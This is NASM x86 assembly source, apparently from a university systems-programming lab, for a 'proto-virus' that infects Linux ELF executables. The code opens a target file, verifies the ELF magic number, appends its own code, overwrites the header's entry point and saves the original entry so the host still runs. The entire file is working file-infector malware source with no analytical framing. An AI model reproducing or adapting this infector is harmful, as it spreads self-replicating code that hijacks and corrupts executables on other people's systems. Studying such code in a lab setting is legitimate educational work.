%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define STDOUT 1
%define STDERR 2
%define fd [ebp-4]
%define buffer [ebp-8]
%define fileSize [ebp-12]
%define virusSize [ebp-14]
%define headerSize 52
%define headerbuffer [ebp-66]
%define oldAdress [ebp-70]

	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

call get_my_loc 
sub ecx, anchor - virusStr  	
write STDOUT, ecx, 17           ;print "this is a virus"

call get_my_loc 
sub ecx, anchor	- FileName
mov eax, ecx
open eax, RDWR, 0x700           ;open the file
cmp eax, -26			        ;means it try to open itself
jne cont
call get_my_loc
sub ecx, anchor - PreviousEntryPoint
jmp dword[ecx]
cont:
cmp eax, 0
jl open_error 

mov fd, eax                     ;save the fd in the stack 

lea ebx, buffer                 ;mov pointer to buffer	
read eax, ebx, 4                ;check the magic number	
cmp eax, 4
jl read_error
cmp dword buffer, 0x464c457f	;compare to magic number
jne elf_error	

mov eax, fd
lseek eax, 0, 2                 ;go to the end of the file
mov fileSize, eax
mov eax, (virus_end - _start)   ;save the size of the file
mov virusSize, eax	

call get_my_loc
sub ecx, anchor - _start        ;save the size of the virus

mov ebx, fd
mov edx, eax
write ebx, ecx, edx             ;write the virus to the infected file
cmp eax, virusSize
jl write_error

cmp eax, 0
jl close_error

lseek ebx, 0, 0                 ; go to the start of the 
lea ecx, headerbuffer
read ebx, ecx, headerSize       ; read elf header of the infected file
lea ecx, headerbuffer
mov eax, dword[ecx+24]
mov oldAdress, eax
mov eax, fileSize
add eax, 0x08048000
mov dword[ecx+24], 0x08048294    ; move to the entry point of the infected file the address of _start

lseek ebx, -4, 2
mov eax, ebx
lea ebx, oldAdress
write eax, ebx, 4         ;change PreviousEntryPoint to point on the original entry point

mov ebx, fd
lseek ebx, 0, 0
lea ecx, headerbuffer
mov edx, headerSize
write ebx, ecx, edx
cmp eax, headerSize
jl write_error

close ebx

call get_my_loc
sub ecx, anchor - PreviousEntryPoint
jmp dword[ecx]

VirusExit:
    exit 0               ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

open_error:
    call get_my_loc
    sub ecx, anchor - open_errorSTR
	write STDERR, ecx, 24
    call get_my_loc
    sub ecx, anchor - PreviousEntryPoint
	jmp dword[ecx]

read_error:
    call get_my_loc
    sub ecx, anchor - read_errorSTR
	write STDERR, ecx, 29
    call get_my_loc
    sub ecx, anchor - PreviousEntryPoint
	jmp dword[ecx]

elf_error:
    call get_my_loc
    sub ecx, anchor - elf_errorSTR
	write STDERR, ecx, 24
    call get_my_loc
    sub ecx, anchor - PreviousEntryPoint
	jmp dword[ecx]	
write_error:
    call get_my_loc
    sub ecx, anchor - write_errorSTR
	write STDERR, ecx, 28
    call get_my_loc
    sub ecx, anchor - PreviousEntryPoint
	jmp dword[ecx]
	
close_error:
    call get_my_loc
    sub ecx, anchor - close_errorSTR
	write STDERR, ecx, 25
    call get_my_loc
    sub ecx, anchor - PreviousEntryPoint
	jmp dword[ecx]


FileName:	db "ELFexec", 0
virusStr: db "This is a virus", 10, 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
open_errorSTR: 	db "Error: Can't open file", 10, 0
read_errorSTR: db "Error: Can't read from file", 10, 0
write_errorSTR: db "Error: Can't write to file", 10, 0
close_errorSTR: db "Error: Can't close file", 10, 0
elf_errorSTR: 	db "Error: Not an ELF file", 10, 0
	
get_my_loc:
	call anchor
anchor: 
	pop ecx
	ret
	
PreviousEntryPoint: dd VirusExit
virus_end:
